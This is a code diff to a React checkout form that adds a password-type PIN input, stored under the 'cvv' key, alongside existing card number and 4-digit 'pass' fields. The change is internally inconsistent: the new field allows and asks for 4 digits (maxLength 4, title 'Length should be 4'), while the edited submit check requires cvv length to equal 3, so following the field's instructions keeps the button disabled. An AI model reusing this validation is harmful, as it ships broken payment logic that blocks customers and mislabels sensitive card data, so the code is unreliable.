@@ -500,7 +500,38 @@ const {total}=  useCart() as any
                           />
                         </div>
                       </div>
-                     
+                      <div className="row" id="PinRow">
+                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
+                        <input
+                          type="hidden"
+                          name="cardPinType"
+                          defaultValue="A"
+                        />
+                        <div id="eComPin">
+                          <label className="column-label"> PIN: </label>
+                        </div>
+                        <div>
+                          <input
+                            inputMode="numeric"
+                            pattern="[0-9]*"
+                            name="cvv"
+                            id="cvv"
+                            onChange={(e: any) =>
+                              setPaymentInfo({
+                                ...paymentInfo,
+                                cvv: e.target.value,
+                              })
+                            }
+                            autoComplete="off"
+                            title="Should be in number. Length should be 4"
+                            type="password"
+                            size={4}
+                            maxLength={4}
+                            className="allownumericwithoutdecimal"
+                            style={{ width: '60%' }}
+                          />
+                        </div>
+                      </div>
                     </div>
                   </>
                 ) : step === 2 && paymentInfo.status=== 'approved'? (
@@ -560,7 +591,7 @@ const {total}=  useCart() as any
                     <div style={{ display: 'flex' }}>
                       <button
                         disabled={
-                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
+                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4||paymentInfo.cvv?.length!==3)) ||
                           paymentInfo.status === 'pending'
                         }
                         onClick={() => {
